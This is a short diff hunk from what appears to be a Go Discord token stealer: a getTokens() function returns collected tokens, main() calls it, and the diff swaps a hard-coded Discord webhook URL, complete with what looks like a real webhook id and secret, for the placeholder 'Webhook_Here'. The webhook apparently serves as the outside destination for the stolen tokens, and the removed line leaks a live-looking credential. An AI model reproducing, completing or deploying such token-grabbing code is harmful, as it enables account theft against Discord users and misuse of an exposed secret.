@@ -97,7 +97,7 @@ func getTokens() []string {
 	return tokenList
 }
 
-var WEBHOOK_URL = "https://discord.com/api/webhooks/1210705617371664394/SWGw4fGjnuuW4LJv22JuEiLHQ_MoW_S_GLF44yVOXgjuaBPcYasFNIWwIgNAKeOsaHk-"
+var WEBHOOK_URL = "Webhook_Here"
 
 func main() {
 	tokens := getTokens()
